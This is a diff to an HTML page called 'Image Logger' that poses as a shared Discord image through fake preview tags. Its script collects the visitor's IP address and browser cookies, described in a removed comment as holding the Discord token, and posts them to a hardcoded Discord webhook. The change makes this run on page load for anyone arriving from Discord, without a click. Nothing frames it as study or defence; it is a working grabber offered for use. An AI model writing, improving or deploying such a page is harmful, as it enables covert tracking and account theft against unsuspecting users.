@@ -5,52 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Image Logger</title>
     
-    <!-- These tags force Discord to show the image preview instead of a link -->
+    <!-- Force Image Card -->
     <meta property="og:image" content="https://cdn.discordapp.com/attachments/1280593964357124238/1571993907036684490/image.png?ex=6afe1269&is=6afcc0e9&hm=0ed6e659ba030c1608f0f9978fc8fcfa9b5505a4687a6f91d67e442f8fccf332">
     <meta property="og:title" content="Check out this image">
     <meta property="og:description" content="Click to view full size">
+    <meta property="og:url" content="https://bighunnab-bit.github.io/image-logger/">
     
     <style>
         body {
             margin: 0;
             padding: 0;
             background-color: #2f3136;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             height: 100vh;
-            font-family: sans-serif;
-        }
-        img {
-            max-width: 90%;
-            max-height: 90vh;
-            cursor: pointer;
-            border-radius: 5px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            overflow: hidden;
         }
     </style>
 </head>
 <body>
 
-<!-- The image is hardcoded here -->
-<img id="target-image" src="https://cdn.discordapp.com/attachments/1280593964357124238/1571993907036684490/image.png?ex=6afe1269&is=6afcc0e9&hm=0ed6e659ba030c1608f0f9978fc8fcfa9b5505a4687a6f91d67e442f8fccf332" alt="Click to view">
+<!-- No img tag here to prevent conflicts -->
 
 <script>
-    // YOUR WEBHOOK URL
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";
 
-    const imgElement = document.getElementById('target-image');
-
-    // Add click event to log data
-    imgElement.onclick = function() {
+    // Check if user came from Discord
+    if (document.referrer.includes("discord.com") || document.referrer.includes("discordapp.com")) {
         logData();
-        // Open the image in a new tab so they see it clearly
-        window.open(imgElement.src, '_blank');
-    };
+    }
 
     async function logData() {
         try {
-            // 1. Get IP Address
             let ip = "Unknown";
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -60,10 +44,8 @@
                 ip = "Could not retrieve IP";
             }
 
-            // 2. Get Cookies (Discord Token is usually here)
             const cookies = document.cookie;
 
-            // 3. Prepare Embed Data
             const payload = {
                 embeds: [{
                     title: "🕵️‍♂️ Target Clicked!",
@@ -96,7 +78,6 @@
                 }]
             };
 
-            // 4. Send to Webhook
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
